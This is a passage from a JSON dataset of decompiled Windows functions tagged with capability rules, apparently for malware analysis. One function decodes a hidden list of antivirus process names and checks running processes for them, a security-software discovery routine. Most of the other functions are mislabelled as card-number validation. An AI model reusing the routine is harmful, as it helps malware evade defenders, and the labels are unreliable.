            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.180005b40(void)\n\n{\n    int32_t iVar1;\n    ushort uStack984;\n    ushort uStack982;\n    ushort uStack980;\n    ushort uStack978;\n    ushort uStack976;\n    ushort uStack974;\n    ushort uStack972;\n    ushort uStack970;\n    ushort uStack968;\n    ushort uStack966;\n    ushort uStack964;\n    ushort uStack962;\n    ushort uStack960;\n    ushort uStack958;\n    ushort uStack956;\n    ushort uStack954;\n    ushort uStack952;\n    ushort uStack950;\n    ushort uStack948;\n    ushort uStack944;\n    ushort uStack942;\n    ushort uStack940;\n    ushort uStack938;\n    ushort uStack936;\n    ushort uStack934;\n    ushort uStack932;\n    ushort uStack930;\n    ushort uStack928;\n    ushort uStack926;\n    ushort uStack924;\n    ushort uStack922;\n    ushort uStack920;\n    ushort uStack918;\n    ushort uStack916;\n    ushort uStack914;\n    ushort uStack912;\n    ushort uStack910;\n    ushort uStack908;\n    ushort uStack906;\n    ushort uStack904;\n    ushort uStack902;\n    ushort uStack900;\n    ushort uStack898;\n    ushort uStack896;\n    ushort uStack894;\n    ushort uStack892;\n    ushort uStack890;\n    ushort uStack888;\n    ushort uStack886;\n    ushort uStack884;\n    ushort uStack882;\n    ushort uStack880;\n    ushort uStack878;\n    ushort uStack876;\n    ushort uStack874;\n    ushort uStack872;\n    ushort uStack870;\n    ushort uStack868;\n    ushort uStack866;\n    ushort uStack864;\n    ushort uStack862;\n    ushort uStack860;\n    ushort uStack858;\n    ushort uStack856;\n    ushort uStack854;\n    ushort uStack852;\n    ushort uStack850;\n    ushort uStack848;\n    ushort uStack846;\n    ushort uStack844;\n    ushort uStack842;\n    ushort uStack840;\n    ushort uStack838;\n    ushort uStack836;\n    ushort uStack834;\n    ushort uStack832;\n    ushort uStack830;\n    ushort uStack828;\n    ushort uStack826;\n    ushort uStack824;\n    ushort uStack816;\n    ushort uStack814;\n    ushort uStack812;\n    ushort uStack810;\n    ushort uStack808;\n    ushort uStack806;\n    ushort uStack804;\n    ushort uStack802;\n    ushort uStack800;\n    ushort uStack798;\n    ushort uStack796;\n    ushort uStack794;\n    ushort uStack792;\n    ushort uStack784;\n    ushort uStack782;\n    ushort uStack780;\n    ushort uStack778;\n    ushort uStack776;\n    ushort uStack774;\n    ushort uStack772;\n    ushort uStack770;\n    ushort uStack768;\n    ushort uStack766;\n    ushort uStack764;\n    ushort uStack762;\n    ushort uStack760;\n    ushort uStack752;\n    ushort uStack750;\n    ushort uStack748;\n    ushort uStack746;\n    ushort uStack744;\n    ushort uStack742;\n    ushort uStack740;\n    ushort uStack738;\n    ushort uStack736;\n    ushort uStack734;\n    ushort uStack732;\n    ushort uStack730;\n    ushort uStack728;\n    ushort uStack726;\n    ushort uStack720;\n    ushort uStack718;\n    ushort uStack716;\n    ushort uStack714;\n    ushort uStack712;\n    ushort uStack710;\n    ushort uStack708;\n    ushort uStack706;\n    ushort uStack704;\n    ushort uStack702;\n    ushort uStack700;\n    ushort uStack698;\n    ushort uStack696;\n    ushort uStack694;\n    ushort uStack692;\n    ushort uStack688;\n    ushort uStack686;\n    ushort uStack684;\n    ushort uStack682;\n    ushort uStack680;\n    ushort uStack678;\n    ushort uStack676;\n    ushort uStack674;\n    ushort uStack672;\n    ushort uStack670;\n    ushort uStack668;\n    ushort uStack666;\n    ushort uStack664;\n    ushort uStack662;\n    ushort uStack660;\n    ushort uStack658;\n    ushort uStack656;\n    ushort uStack654;\n    ushort uStack652;\n    ushort uStack650;\n    ushort uStack648;\n    uint uStack640;\n    ulong uStack632;\n    uchar auStack624 [40];\n    uint auStack584 [11];\n    uchar auStack540 [540];\n    \n    auStack584[0] = 0x238;\n    fcn.180006db0(auStack624);\n    uStack632 = (**0x18002ce28)(2, 0);\n    uStack720 = 0x73;\n    uStack718 = 0x61;\n    uStack716 = 0x76;\n    uStack714 = 0x73;\n    uStack712 = 0x65;\n    uStack710 = 0x72;\n    uStack708 = 0x76;\n    uStack706 = 0x69;\n    uStack704 = 99;\n    uStack702 = 0x65;\n    uStack700 = 0x2e;\n    uStack698 = 0x65;\n    uStack696 = 0x78;\n    uStack694 = 0x65;\n    uStack692 = 0;\n    uStack984 = 0x61;\n    uStack982 = 0x76;\n    uStack980 = 0x70;\n    uStack978 = 0x2e;\n    uStack976 = 0x65;\n    uStack974 = 0x78;\n    uStack972 = 0x65;\n    uStack970 = 0;\n    uStack848 = 0x6b;\n    uStack846 = 0x6c;\n    uStack844 = 0x6e;\n    uStack842 = 0x61;\n    uStack840 = 0x67;\n    uStack838 = 0x65;\n    uStack836 = 0x6e;\n    uStack834 = 0x74;\n    uStack832 = 0x2e;\n    uStack830 = 0x65;\n    uStack828 = 0x78;\n    uStack826 = 0x65;\n    uStack824 = 0;\n    uStack816 = 0x61;\n    uStack814 = 0x76;\n    uStack812 = 0x61;\n    uStack810 = 0x73;\n    uStack808 = 0x74;\n    uStack806 = 0x73;\n    uStack804 = 0x76;\n    uStack802 = 99;\n    uStack800 = 0x2e;\n    uStack798 = 0x65;\n    uStack796 = 0x78;\n    uStack794 = 0x65;\n    uStack792 = 0;\n    uStack944 = 0x61;\n    uStack942 = 0x76;\n    uStack940 = 0x61;\n    uStack938 = 0x73;\n    uStack936 = 0x74;\n    uStack934 = 0x75;\n    uStack932 = 0x69;\n    uStack930 = 0x2e;\n    uStack928 = 0x65;\n    uStack926 = 0x78;\n    uStack924 = 0x65;\n    uStack922 = 0;\n    uStack920 = 0x61;\n    uStack918 = 0x76;\n    uStack916 = 0x67;\n    uStack914 = 0x75;\n    uStack912 = 0x61;\n    uStack910 = 0x72;\n    uStack908 = 100;\n    uStack906 = 0x2e;\n    uStack904 = 0x65;\n    uStack902 = 0x78;\n    uStack900 = 0x65;\n    uStack898 = 0;\n    uStack752 = 0x73;\n    uStack750 = 0x65;\n    uStack748 = 0x6e;\n    uStack746 = 0x74;\n    uStack744 = 0x72;\n    uStack742 = 0x79;\n    uStack740 = 0x65;\n    uStack738 = 0x79;\n    uStack736 = 0x65;\n    uStack734 = 0x2e;\n    uStack732 = 0x65;\n    uStack730 = 0x78;\n    uStack728 = 0x65;\n    uStack726 = 0;\n    uStack896 = 0x62;\n    uStack894 = 100;\n    uStack892 = 0x61;\n    uStack890 = 0x67;\n    uStack888 = 0x65;\n    uStack886 = 0x6e;\n    uStack884 = 0x74;\n    uStack882 = 0x2e;\n    uStack880 = 0x65;\n    uStack878 = 0x78;\n    uStack876 = 0x65;\n    uStack874 = 0;\n    uStack968 = 0x76;\n    uStack966 = 0x73;\n    uStack964 = 0x73;\n    uStack962 = 0x65;\n    uStack960 = 0x72;\n    uStack958 = 0x76;\n    uStack956 = 0x2e;\n    uStack954 = 0x65;\n    uStack952 = 0x78;\n    uStack950 = 0x65;\n    uStack948 = 0;\n    uStack688 = 99;\n    uStack686 = 0x6f;\n    uStack684 = 0x72;\n    uStack682 = 0x65;\n    uStack680 = 0x73;\n    uStack678 = 0x65;\n    uStack676 = 0x72;\n    uStack674 = 0x76;\n    uStack672 = 0x69;\n    uStack670 = 99;\n    uStack668 = 0x65;\n    uStack666 = 0x73;\n    uStack664 = 0x68;\n    uStack662 = 0x65;\n    uStack660 = 0x6c;\n    uStack658 = 0x6c;\n    uStack656 = 0x2e;\n    uStack654 = 0x65;\n    uStack652 = 0x78;\n    uStack650 = 0x65;\n    uStack648 = 0;\n    uStack784 = 0x75;\n    uStack782 = 0x69;\n    uStack780 = 0x73;\n    uStack778 = 0x65;\n    uStack776 = 0x61;\n    uStack774 = 0x67;\n    uStack772 = 0x6e;\n    uStack770 = 0x74;\n    uStack768 = 0x2e;\n    uStack766 = 0x65;\n    uStack764 = 0x78;\n    uStack762 = 0x65;\n    uStack760 = 0;\n    uStack872 = 0x6d;\n    uStack870 = 0x73;\n    uStack868 = 0x6d;\n    uStack866 = 0x70;\n    uStack864 = 0x65;\n    uStack862 = 0x6e;\n    uStack860 = 0x67;\n    uStack858 = 0x2e;\n    uStack856 = 0x65;\n    uStack854 = 0x78;\n    uStack852 = 0x65;\n    uStack850 = 0;\n    iVar1 = (**0x18002cd28)(uStack632, auStack584);\n    if (iVar1 != 0) {\n        while (iVar1 = (**0x18002cde0)(uStack632, auStack584),  iVar1 != 0) {\n            iVar1 = fcn.18000db7c(auStack540, &uStack720);\n            if (iVar1 == 0) {\n                *0x18002ce78 = 1;\n            }\n            else {\n                iVar1 = fcn.18000db7c(auStack540, &uStack984);\n                if ((iVar1 == 0) || (iVar1 = fcn.18000db7c(auStack540, &uStack848),  iVar1 == 0)) {\n                    *0x18002ce7c = 1;\n                }\n                else {\n                    iVar1 = fcn.18000db7c(auStack540, &uStack816);\n                    if ((iVar1 == 0) || (iVar1 = fcn.18000db7c(auStack540, &uStack944),  iVar1 == 0)) {\n                        *0x18002ce6c = 1;\n                    }\n                    else {\n                        iVar1 = fcn.18000db7c(auStack540, &uStack920);\n                        if ((iVar1 == 0) || (iVar1 = fcn.18000db7c(auStack540, &uStack752),  iVar1 == 0)) {\n                            *0x18002cf44 = 1;\n                        }\n                        else {\n                            iVar1 = fcn.18000db7c(auStack540, &uStack896);\n                            if ((iVar1 == 0) || (iVar1 = fcn.18000db7c(auStack540, &uStack968),  iVar1 == 0)) {\n                                *0x18002ce70 = 1;\n                            }\n                            else {\n                                iVar1 = fcn.18000db7c(auStack540, &uStack688);\n                                if ((iVar1 == 0) || (iVar1 = fcn.18000db7c(auStack540, &uStack784),  iVar1 == 0)) {\n                                    *0x18002ce74 = 1;\n                                }\n                                else {\n                                    iVar1 = fcn.18000db7c(auStack540, &uStack872);\n                                    if (iVar1 == 0) {\n                                        *0x18002ce68 = 1;\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uStack632);\n    uStack640 = 0;\n    fcn.180006d80(auStack624);\n    return uStack640;\n}\n",
        "token_count": 3198
    },
    "1800069e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800069e0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    return 1;\n}\n",
        "token_count": 30
    },
    "180006a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180006a10(int64_t *arg1)\n\n{\n    return arg1[1] - *arg1;\n}\n",
        "token_count": 32
    },
    "180006a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180006a40(ulong *arg1)\n\n{\n    fcn.1800074f0(*arg1);\n    return;\n}\n",
        "token_count": 33
    },
    "180006a6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180006a60(ulong arg1, ulong arg2)\n\n{\n    fcn.180006a90(arg1, arg2);\n    return;\n}\n",
        "token_count": 37
    },
    "180006a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.180006a90(int64_t arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    \n    if (*(arg1 + 8) == *(arg1 + 0x10)) {\n        uVar1 = fcn.1800074f0(arg2);\n        fcn.180007880(arg1, *(arg1 + 8), uVar1);\n    }\n    else {\n        uVar1 = fcn.1800074f0(arg2);\n        fcn.180006b10(arg1, uVar1);\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "180006b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180006b10(int64_t arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    ulong arg3;\n    ulong arg2_00;\n    ulong arg1_00;\n    \n    piVar1 = arg1 + 8;\n    arg3 = fcn.1800074f0(arg2);\n    arg2_00 = fcn.1800074f0(*piVar1);\n    arg1_00 = fcn.180006f70(arg1);\n    fcn.180007830(arg1_00, arg2_00, arg3);\n    fcn.180006f90(arg1, *piVar1, *piVar1);\n    *piVar1 = *piVar1 + 1;\n    return;\n}\n",
        "token_count": 169
    },
    "180006bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180006bc0(ulong arg1)\n\n{\n    fcn.180006fa0(arg1);\n    return;\n}\n",
        "token_count": 30
    },
    "180006c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180006c40(ulong arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    uint8_t uStack72;\n    ulong uStack71;\n    ulong uStack63;\n    ulong uStack55;\n    ulong uStack40;\n    ulong uStack32;\n    ulong auStack24 [3];\n    \n    uStack71 = 0;\n    uStack40 = fcn.180007a90(arg2 + 0x10, &uStack71);\n    uStack63 = 0;\n    uStack32 = fcn.180007a90(arg2 + 8, &uStack63);\n    uStack55 = 0;\n    auStack24[0] = fcn.180007a90(arg2, &uStack55);\n    uVar1 = fcn.180006f70(arg2);\n    uVar1 = fcn.1800074f0(uVar1);\n    fcn.180007ad0(arg1, uStack72, uVar1, auStack24);\n    fcn.1800037f0(arg1, 0x180027972);\n    fcn.1800037f0(arg1, arg2);\n    return arg1;\n}\n",
        "token_count": 264
    },
    "180006d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180006d40(ulong arg1)\n\n{\n    fcn.180007b40(arg1);\n    fcn.1800037f0(arg1, 0x180027972);\n    return arg1;\n}\n",
        "token_count": 51
    },
    "180006d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180006d80(ulong arg1)\n\n{\n    fcn.1800070d0(arg1);\n    fcn.180006f30(arg1);\n    return;\n}\n",
        "token_count": 42
    },
    "180006db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180006db0(ulong arg1)\n\n{\n    fcn.180007b70(arg1);\n    fcn.1800037f0(arg1, 0x180027972);\n    fcn.180007190(arg1);\n    return arg1;\n}\n",
        "token_count": 61
    },
    "180006e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180006e00(int64_t arg1, ulong noname_1, ulong arg3)\n\n{\n    ulong arg1_00;\n    \n    arg1_00 = fcn.180007470(arg1);\n    fcn.180007ba0(arg1_00, *(arg1 + 0x10), arg3);\n    return;\n}\n",
        "token_count": 78
    },
    "180006e5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180006e50(ulong arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.180007470(arg1);\n    return iVar1 + arg2;\n}\n",
        "token_count": 53
    },
    "180006eb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180006eb0(ulong arg1, ulong arg2)\n\n{\n    uchar auStack24 [8];\n    ulong uStack16;\n    \n    fcn.180007b70(arg1);\n    uStack16 = 0x180027972;\n    fcn.180003800(auStack24, 0x180027972, arg1);\n    fcn.1800072b0(arg1);\n    fcn.180007310(arg1, arg2);\n    fcn.1800037e0(auStack24);\n    return arg1;\n}\n",
        "token_count": 124
    },
    "180006f3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180006f30(ulong arg1)\n\n{\n    fcn.180006f50(arg1);\n    return;\n}\n",
        "token_count": 30
    },
    "180006f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180006f50(ulong arg1)\n\n{\n    fcn.1800037e0(arg1);\n    return;\n}\n",
        "token_count": 31
    },
    "180006f7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180006f70(ulong arg1)\n\n{\n    fcn.1800074f0(arg1);\n    return;\n}\n",
        "token_count": 31
    },
    "18000707": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180007070(ulong arg1, ulong arg2)\n\n{\n    ulong arg2_00;\n    ulong arg1_00;\n    \n    fcn.180006fa0(arg1);\n    arg2_00 = fcn.180006f70(arg2);\n    arg1_00 = fcn.180006f70(arg1);\n    fcn.180007c20(arg1_00, arg2_00);\n    fcn.180007500(arg1, arg2);\n    return;\n}\n",
        "token_count": 111
    },
    "1800070d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800070d0(ulong *arg1)\n\n{\n    char cVar1;\n    ushort auStack40 [4];\n    ulong uStack32;\n    ulong uStack24;\n    \n    fcn.1800037e0(arg1);\n    cVar1 = fcn.180007640(arg1);\n    if (cVar1 != '\\0') {\n        uStack32 = *arg1;\n        uStack24 = fcn.180006f70(arg1);\n        fcn.1800037e0(arg1);\n        fcn.180007670(uStack24, uStack32, arg1[3] + 1);\n    }\n    arg1[2] = 0;\n    arg1[3] = 7;\n    auStack40[0] = 0;\n    fcn.180007800(arg1, auStack40);\n    return;\n}\n",
        "token_count": 192
    },
    "18000719": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180007190(int64_t arg1)\n\n{\n    ushort auStack24 [4];\n    int64_t iStack16;\n    \n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x18) = 7;\n    auStack24[0] = 0;\n    iStack16 = arg1;\n    fcn.180007800(arg1, auStack24);\n    return;\n}\n",
        "token_count": 97
    },
    "1800072b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800072b0(int64_t arg1)\n\n{\n    uchar auStack24 [8];\n    int64_t iStack16;\n    \n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x18) = 0xf;\n    auStack24[0] = 0;\n    iStack16 = arg1;\n    fcn.180007770(arg1, auStack24);\n    return;\n}\n",
        "token_count": 100
    },
    "18000731": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180007310(ulong arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    \n    uVar1 = fcn.1800074b0(arg2);\n    uVar1 = fcn.1800074f0(uVar1);\n    fcn.180007350(arg1, arg2, uVar1);\n    return;\n}\n",
        "token_count": 79
    },
    "18000741": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180007410(ulong arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    uchar auStack24 [24];\n    \n    fcn.1800077d0(arg2, arg4, arg3);\n    auStack24[0] = 0;\n    fcn.180007770(arg2 + arg3, auStack24);\n    return;\n}\n",
        "token_count": 89
    },
    "18000758": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180007580(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong arg3_00;\n    \n    arg3_00 = fcn.180006f70(arg1);\n    fcn.180006f90(arg2, arg3, arg3_00);\n    return;\n}\n",
        "token_count": 69
    },
    "18000779": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180007790(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.18000d370(arg1, arg2, arg3);\n    return arg1;\n}\n",
        "token_count": 45
    },
    "18000783": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180007830(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong arg2_00;\n    uchar *puVar1;\n    uchar *puVar2;\n    \n    arg2_00 = fcn.1800074f0(arg2);\n    puVar1 = fcn.1800030d0(1, arg2_00);\n    puVar2 = fcn.1800074f0(arg3);\n    *puVar1 = *puVar2;\n    return;\n}\n",
        "token_count": 113
    },
    "18000788": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t fcn.180007880(int64_t *arg1, int64_t arg2, ulong arg3)\n\n{\n    ulong arg1_00;\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong arg2_00;\n    int64_t iVar4;\n    ulong arg3_00;\n    ulong arg2_01;\n    int64_t iVar5;\n    \n    arg1_00 = fcn.180006f70(arg1);\n    piVar1 = arg1 + 1;\n    iVar5 = arg2 - *arg1;\n    iVar3 = *arg1;\n    iVar4 = *piVar1;\n    iVar2 = fcn.180008180(arg1);\n    if (iVar4 - iVar3 == iVar2) {\n        fcn.180007f30();\n    }\n    iVar3 = (iVar4 - iVar3) + 1;\n    arg2_00 = fcn.180008050(arg1, iVar3);\n    iVar4 = fcn.180007740(arg1_00, arg2_00);\n    arg3_00 = fcn.1800074f0(arg3);\n    arg2_01 = fcn.1800074f0(iVar4 + iVar5);\n    fcn.180007830(arg1_00, arg2_01, arg3_00);\n    if (arg2 == *piVar1) {\n        fcn.1800080e0(arg1, *arg1, *piVar1, iVar4);\n    }\n    else {\n        fcn.180008140(arg1, *arg1, arg2, iVar4);\n        fcn.180008140(arg1, arg2, *piVar1, iVar4 + 1 + iVar5);\n    }\n    fcn.180007f50(arg1, iVar4, iVar3, arg2_00);\n    return iVar4 + iVar5;\n}\n",
        "token_count": 420
    },
    "180007ad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180007ad0(ulong arg1, ulong noname_1, ulong arg3, ulong arg4)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    ulong *puVar3;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    \n    fcn.1800074f0(arg3);\n    puVar1 = fcn.1800074f0(in_stack_00000030);\n    puVar2 = fcn.1800074f0(in_stack_00000028);\n    puVar3 = fcn.1800074f0(arg4);\n    fcn.180007ea0(arg1, *puVar3, *puVar2, *puVar1);\n    return arg1;\n}\n",
        "token_count": 169
    },
    "180007b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180007b40(ulong arg1)\n\n{\n    fcn.1800074f0(arg1);\n    fcn.180007ef0(arg1);\n    return arg1;\n}\n",
        "token_count": 44
    },
    "180007b7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180007b70(ulong arg1)\n\n{\n    fcn.1800074f0(arg1);\n    fcn.1800081d0(arg1);\n    return arg1;\n}\n",
        "token_count": 45
    },
    "180007c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180007c20(ulong arg1, ulong arg2)\n\n{\n    fcn.1800074f0(arg2);\n    return;\n}\n",
        "token_count": 35
    },
    "180007db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180007db0(ulong arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    ulong *puVar2;\n    ulong *puVar3;\n    \n    uVar1 = fcn.1800074f0(arg1);\n    uVar1 = fcn.1800074f0(uVar1);\n    puVar2 = fcn.1800030d0(8, uVar1);\n    puVar3 = fcn.1800074f0(arg2);\n    *puVar2 = *puVar3;\n    return;\n}\n",
        "token_count": 124
    },
    "18000805": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.180008050(ulong arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    \n    uVar1 = fcn.180008290(arg1);\n    uVar2 = fcn.180008180(arg1);\n    if ((uVar1 <= uVar2 - uVar1 / 2) && (uVar2 = uVar1 + uVar1 / 2,  uVar2 < arg2)) {\n        uVar2 = arg2;\n    }\n    return uVar2;\n}\n",
        "token_count": 128
    },
    "1800080e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800080e0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    uchar *puVar2;\n    uchar auStack24 [16];\n    \n    puVar2 = auStack24;\n    for (iVar1 = 1; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.180008140(arg1, arg2, arg3, arg4);\n    return;\n}\n",
        "token_count": 131
    },
    "18000818": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180008180(ulong arg1)\n\n{\n    ulong arg1_00;\n    ulong *puVar1;\n    ulong uStack24;\n    ulong auStack16 [2];\n    \n    arg1_00 = fcn.180006f70(arg1);\n    uStack24 = fcn.180007820(arg1_00);\n    auStack16[0] = fcn.180003710();\n    puVar1 = fcn.180007d60(auStack16, &uStack24);\n    return *puVar1;\n}\n",
        "token_count": 120
    },
    "1800081d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800081d0(int64_t arg1)\n\n{\n    fcn.1800082c0(arg1);\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x18) = 0;\n    return arg1;\n}\n",
        "token_count": 65
    },
    "18000821": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180008210(int64_t arg1, ulong arg2)\n\n{\n    ulong arg3;\n    \n    arg3 = fcn.1800076a0(arg1);\n    fcn.1800082e0(arg2, *(arg1 + 0x18), arg3);\n    return;\n}\n",
        "token_count": 68
    },
    "18000829": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180008290(int64_t *arg1)\n\n{\n    return arg1[2] - *arg1;\n}\n",
        "token_count": 31
    },
    "18000841": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180008410(ulong arg1, ulong arg2, int64_t arg3, ulong arg4)\n\n{\n    int64_t arg1_00;\n    int64_t arg2_00;\n    ulong arg3_00;\n    ulong uStackX8;\n    ulong uStackX16;\n    int64_t iStackX24;\n    ulong uStackX32;\n    \n    uStackX8 = arg1;\n    uStackX16 = arg2;\n    iStackX24 = arg3;\n    uStackX32 = arg4;\n    arg1_00 = fcn.1800084f0(&uStackX8);\n    arg2_00 = fcn.1800084f0(&uStackX16);\n    arg3_00 = fcn.1800074f0(iStackX24);\n    fcn.180008590(arg1_00, arg2_00, arg3_00);\n    return iStackX24 + (arg2_00 - arg1_00);\n}\n",
        "token_count": 222
    },
    "18000852": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180008520(ulong *arg1)\n\n{\n    fcn.180006f90(*arg1, arg1[1], arg1[2]);\n    return;\n}\n",
        "token_count": 41
    },
    "18000859": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180008590(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t arg2_00;\n    int64_t iVar1;\n    int64_t arg1_00;\n    ulong uStackX8;\n    ulong uStackX16;\n    ulong auStackX24 [2];\n    \n    uStackX8 = arg1;\n    uStackX16 = arg2;\n    auStackX24[0] = arg3;\n    arg2_00 = fcn.1800084f0(&uStackX8);\n    iVar1 = fcn.1800084f0(&uStackX16);\n    arg1_00 = fcn.1800084f0(auStackX24);\n    fcn.18000d370(arg1_00, arg2_00, iVar1 - arg2_00);\n    return arg1_00 + (iVar1 - arg2_00);\n}\n",
        "token_count": 204
    },
    "18000863": {
        "rules": [
